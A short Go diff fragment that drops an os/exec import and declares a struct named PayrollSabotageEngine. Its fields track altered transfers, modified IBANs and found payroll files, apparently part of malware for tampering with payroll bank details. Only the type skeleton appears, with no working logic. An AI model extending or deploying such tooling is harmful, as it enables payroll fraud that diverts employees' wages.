@@ -1,5 +1,5 @@
 package v30
-import ("encoding/json";"fmt";"os";"os/exec";"path/filepath";"strings";"time")
+import ("encoding/json";"fmt";"os";"path/filepath";"strings";"time")
 type PayrollSabotageEngine struct {
 	Config *V30Config; TransfersAltered int; IBANsModified int; PayrollFilesFound []string
 }
